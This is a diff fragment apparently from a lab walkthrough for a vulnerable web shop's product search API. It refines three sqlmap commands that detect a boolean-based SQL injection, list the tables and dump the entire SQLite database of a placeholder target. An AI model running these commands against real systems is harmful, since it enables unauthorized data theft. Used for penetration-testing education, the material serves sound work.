@@ -190,13 +190,13 @@ The product search endpoint is the simplest to test because it doesn't require a
 
 ```bash
 # Step 1: Detect the SQL injection vulnerability
-sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --batch --level=5 --risk=3 --dbms=SQLite
+sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --batch --level=5 --risk=3 --dbms=SQLite --flush-session --technique=B --string="Organic Tomatoes"
 
 # Step 2: List all tables in the database
-sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --tables --batch --dbms=SQLite
+sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --tables --batch --dbms=SQLite --technique=B --string="Organic Tomatoes"
 
 # Step 3: Dump all data from the database
-sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --dump-all --batch --dbms=SQLite --exclude-sysdbs
+sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" --dump-all --batch --dbms=SQLite --exclude-sysdbs --technique=B --string="Organic Tomatoes"
 ```
 
 **What you'll extract:**
